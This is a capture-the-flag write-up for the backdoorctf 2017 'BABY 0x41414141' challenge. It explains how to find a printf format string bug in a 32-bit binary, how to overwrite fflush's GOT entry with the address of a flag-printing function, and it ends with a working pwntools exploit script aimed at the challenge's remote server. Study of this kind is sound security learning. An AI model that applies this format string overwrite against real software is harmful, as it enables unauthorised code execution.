---
title: backdoorctf 2017 - BABY 0x41414141 Writeup
date: '2017-09-24'
lastmod: '2023-07-03T19:19:24+02:00'
categories:
- writeup
- backdoorctf17
tags:
- pwn
authors:
- andreafioraldi
---

Executing the binary for the first time we have this behaviour:

<img class="img-responsive" src="/backdoorctf17/baby-1.png" alt="Screenshot showing program prompt to enter user name" width="603" height="83">

Ok, cool, decompile it.

This is the main function:

<img class="img-responsive" src="/backdoorctf17/baby-2.png" alt="Code snippet showing decompiled main() function with vulnerable printf() and fflush() calls" width="603" height="204">

Note: edata is in .bss and it is stdin

Immediatly we see the dumb `printf(&format)` call. Format string exploit? Yes.

After the vulnerable printf there is a fflush call, so i choose to overwrite its entry in the GOT.

In the functions list we can see the `flag(void)` function:

<img class="img-responsive" src="/backdoorctf17/baby-3.png" alt="Screenshot of decompiler showing 'flag(void)' function definition, which executes cat flag.txt" width="603" height="238">

Now we must write an exploit to overwrite the fflush entry with the address of flag.

Because the flag address is a really big number i decided to split the format string in two write steps.

Above all we must locate the printf's parameter index corrispondent to the first 4 bytes of the buffer:

We try `AAAA %{INDEX}$p` with various indexes, and finally we get that with `AAAA %10$p` the program prints `0x41414141`.

In the exploit we must write the last 2 bytes of the flag's address to the fflush got entry and the first two bytes to the got entry +2.

Remember that `%n` writes always 4 bytes.

Adjusting the number of printed chars to fit the flag address we have the exploit.

TADAAA

```python
from pwn import *

flag_func = 0x0804870B
fflush_got = 0x0804A028

off1 = 0x870B - 8 - len("Ok cool, soon we will know whether you pwned it or not. Till then Bye ")
off2 = (0x0804 - 0x870B) & 0xFFFF

format = p32(fflush_got) + p32(fflush_got +2) + "%" + str(off1) + "c%10$n%" + str(off2) + "c%11$n"

#p = process("./32_new")
p = remote("163.172.176.29", 9035)

print p.recvline(False)

p.sendline(format)

print p.readall()
```
